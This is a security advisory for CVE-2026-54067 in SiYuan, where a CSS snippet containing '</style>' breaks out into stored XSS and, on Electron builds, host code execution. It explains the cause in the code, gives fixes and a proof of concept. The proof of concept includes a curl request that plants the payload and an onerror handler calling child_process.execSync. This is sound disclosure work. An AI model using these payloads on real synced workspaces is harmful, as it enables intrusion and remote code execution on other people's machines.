# [C] SiYuan: Stored XSS to RCE via CSS-snippet <style> breakout in renderSnippet()

## Summary
Severity: Critical
Advisory: GHSA-mvjr-vv3c-w4qv
CVE: CVE-2026-54067
CWE: CWE-1188, CWE-79
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-10
Source: https://github.com/advisories/GHSA-mvjr-vv3c-w4qv
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <0.0.0-20260628153353-2d5d72223df4

## Details
### Summary

A CSS snippet body containing `</style>` breaks out of its surrounding `<style>` tag when `renderSnippet()` interpolates it via `insertAdjacentHTML`. A payload like `</style><img src=x onerror="...">` runs arbitrary JavaScript in the renderer. On Electron desktop builds the renderer runs with `nodeIntegration:true`, so `require('child_process')` is reachable from the injected handler and the XSS chains to host RCE. Snippets sync via the workspace repository, so an attacker with write access to any synced workspace plants the payload once and it fires on every device that pulls.

The bug also bypasses the user's `enabledCSS` / `enabledJS` separation. A user who turned `enabledJS` off was making a deliberate call not to run untrusted JavaScript; the CSS path runs it anyway.

### Details

Affected:

- HEAD `96dfe0b` (v3.6.5, 2026-04-21)
- Sink: `app/src/config/util/snippets.ts:32`
- Source: `/api/snippet/getSnippet`, backed by `data/snippets/conf.json`
- Default config: `EnabledCSS: true`, `EnabledJS: true` at `kernel/conf/snippet.go:26-27`
- Electron config: `nodeIntegration:true`, `contextIsolation:false`, `webSecurity:false` on every `BrowserWindow` in `app/electron/main.js:307,408-411,1107-1110,1150-1153,1322`

The write path stores raw content. `kernel/api/snippet.go:107-130` copies `Content` from the request straight into the snippet record with no HTML escape, no `</style>` check, no type-specific validation:

```go
snippet := &conf.Snippet{
    ID:      m["id"].(string),
    Name:    m["name"].(string),
    Type:    m["type"].(string),
    Content: m["content"].(string),
    Enabled: m["enabled"].(bool),
}
```

Storage is workspace-internal and syncs. `kernel/model/repository.go:1748,1798` reference `data/snippets/conf.json`, so the malicious record propagates to every sync peer.

The renderer reads the snippet back through `/api/snippet/getSnippet` and interpolates it into a `<style>` tag, raw. `app/src/config/util/snippets.ts:32`, called on app boot and on the `reloadSnippet` WebSocket event:

```ts
fetchPost("/api/snippet/getSnippet", {type: "all", enabled: 2}, (response) => {
  response.data.snippets.forEach((item: ISnippet) => {
    const id = `snippet${item.type === "css" ? "CSS" : "JS"}${item.id}`;
    if (item.type === "css") {
      document.head.insertAdjacentHTML("beforeend", `<style id="${id}">${item.content}</style>`);
    } else if (item.type === "js") {
      // intentional script-loading path
    }
  });
});
```

`${item.content}` lands inside the `<style>` tag. The HTML parser closes the style on the first `</style>` substring and treats anything after as a sibling of the empty `<style>` element.

Worth noting: the JS branch right after the CSS one already does the safe thing. It uses `document.createElement("script")` and sets `el.text = item.content`. That's a text-node assignment, no HTML parsing. The CSS branch just doesn't use the equivalent on a `<style>` element, and that's the bug.

#### Suggested fix

The cleanest fix mirrors what the JS branch already does. Build the element with `createElement` and set `textContent`:

```ts
if (item.type === "css") {
  const el = document.createElement("style");
  el.id = id;
  el.textContent = item.content;
  document.head.appendChild(el);
}
```

`textContent` on a `<style>` element populates the CSS rules without invoking the HTML parser, so `</style>` in the body is a 4-character text node instead of a close tag.

If touching that line is undesirable, the smaller patch is to escape `<` before interpolation:

```ts
const safe = item.content.replace(/[&<]/g, c => c === "&" ? "&amp;" : "&lt;");
document.head.insertAdjacentHTML("beforeend", `<style id="${id}">${safe}</style>`);
```

Either fix on its own closes the bug. Worth also rejecting `</style>` on the `setSnippet` backend handler so older renderers pulling the same synced workspace stay safe.

### PoC

Stand up SiYuan:

```bash
docker run -d --name siyuan-poc \
  -v ./workspace:/siyuan/workspace \
  -p 16806:6806 \
  b3log/siyuan:latest \
  --workspace=/siyuan/workspace --accessAuthCode=hunter2
```

Plant the snippet:

```bash
TOKEN=$(jq -r '.api.token' workspace/conf/conf.json)

curl -X POST http://localhost:16806/api/snippet/setSnippet \
  -H "Content-Type: application/json" \
  -H "Authorization: Token $TOKEN" \
  -d '{"snippets":[{"id":"","name":"poc","type":"css","enabled":true,"content":"</style><img src=x onerror=\"document.title=\\\"SIYUAN_XSS\\\";window.__siyuan_xss=true\">"}]}'
```

Returns `{"code":0,"msg":"","data":null}`. The snippet now sits at `workspace/data/snippets/conf.json` verbatim.

Open `http://localhost:16806/stage/build/desktop/?r=1` or the Electron app pointing at the same workspace, authenticate, and run in DevTools:

```js
({
  markerFired: window.__siyuan_xss === true,
  styleCount: document.querySelectorAll('style[id^="snippetCSS"]').length,
  imgsInHead: document.head.querySelectorAll('img').length,
  snippetStyleEmpty: document.querySelector('style[id^="snippetCSS"]')?.textContent.length === 0
})
```

Result from my run on 2026-05-19 against `b3log/siyuan:latest`:

```json
{
  "markerFired": true,
  "styleCount": 1,
  "imgsInHead": 1,
  "snippetStyleEmpty": true
}
```

`document.title` is `SIYUAN_XSS`. The `<style>` exists but closed empty on the first `</style>`. The smuggled `<img>` is a sibling in `<head>`. The injected `onerror` ran arbitrary JS.

To turn it into RCE on Electron, swap the marker payload for:

```html
<img src=x onerror="require('child_process').execSync('open /Applications/Calculator.app')">
```

`require` is reachable from the renderer because of `nodeIntegration:true` in `app/electron/main.js:408`.

### Impact

Stored XSS to RCE on Electron desktop builds, plus XSS on mobile and Docker web builds.

The payload fires whenever the renderer refreshes snippets: on boot, on manual reload, or on a `reloadSnippet` WebSocket push. No user click required beyond having the app open.

Anyone affected by a workspace-write compromise is exposed. Realistic paths in: compromised SiYuan Cloud / S3 / WebDAV sync credentials, a workspace folder mounted on a shared filesystem (Dropbox, Syncthing, network share, git), or a multi-user Docker server where any authenticated user can call `/api/snippet/setSnippet`. Once the malicious snippet is in the workspace, every peer that syncs and has `enabledCSS:true` runs the payload.

The bug also silently bypasses the user's snippet-toggle intent. Someone who turned `enabledJS` off and left `enabledCSS` on was making a deliberate decision not to run untrusted JavaScript. The CSS path runs it anyway.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-mvjr-vv3c-w4qv
- https://nvd.nist.gov/vuln/detail/CVE-2026-54067
- https://github.com/siyuan-note/siyuan
